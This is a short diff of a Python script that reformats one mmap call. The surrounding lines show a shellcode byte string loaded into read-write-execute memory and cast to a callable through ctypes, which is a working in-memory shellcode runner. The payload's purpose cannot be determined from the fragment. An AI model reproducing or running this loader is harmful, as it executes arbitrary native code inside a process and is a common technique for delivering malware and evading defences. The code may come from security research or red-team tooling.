@@ -62,7 +62,12 @@ shellcode = (
     b"\xc6\xf8\x78\x4e\x9a\xe4\xa6\xef\x89\xc2\x71\x46\xf6\xdd"
     b"\xd1\xec\xb8\xda\x26\x7a\xf9\x8e\x86\xb8\xe6"
 )
-memory = mmap(-1, PAGESIZE, MAP_SHARED, PROT_READ | PROT_WRITE | PROT_EXEC,)
+memory = mmap(
+    -1,
+    PAGESIZE,
+    MAP_SHARED,
+    PROT_READ | PROT_WRITE | PROT_EXEC,
+)
 memory.write(shellcode)
 pointer = int.from_bytes(string_at(id(memory) + 16, 8), "little")
 functype = CFUNCTYPE(c_void_p)
